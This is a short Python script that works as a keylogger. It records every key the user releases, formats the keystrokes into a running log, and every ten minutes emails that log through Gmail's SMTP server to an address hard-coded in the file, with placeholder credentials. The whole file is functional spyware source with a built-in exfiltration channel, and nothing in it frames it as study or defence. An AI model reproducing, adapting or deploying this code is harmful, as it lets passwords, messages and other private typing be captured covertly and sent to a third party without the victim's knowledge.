import keyboard
import smtplib
from threading import Semaphore, Timer

SEND = 600										#Interval of sending mails with the key logs. default = 600 seconds
EMAIL_PASS = "examplepassword"									#Your Email Password here
EMAIL_ADD = "exampleemail@gmail.com"									#Your Email Address here

class keylog:
	def __init__(my, interval):
		my.interval = interval
		my.log = ""
		my.semaphore = Semaphore(0)

	def call (my, event):
		name = event.name
		if len(name) > 1:
			if name == "space":
				name = " "
			elif name == "enter":
				name = "[ENTER]\n"
			else:
				name = name.replace(" ", "_")
				name = f"[{name.upper()}]"
		my.log += name

	def send(my, email, password, message):
		server = smtplib.SMTP (host = "smtp.gmail.com", port = 587)
		server.starttls()
		server.login(email,password)
		server.sendmail(email,email,message)
		server.quit()

	def report(my):
		if my.log:
			my.send(EMAIL_ADD,EMAIL_PASS,my.log)
		my.log = ""
		Timer(interval=my.interval,function=my.report).start()

	def start(my):
		keyboard.on_release(call=my.call)
		my.report()
		my.semaphore.acquire()

if __name__ == '__main__':
	keylog = keylog(interval = SEND)
	keylog.start()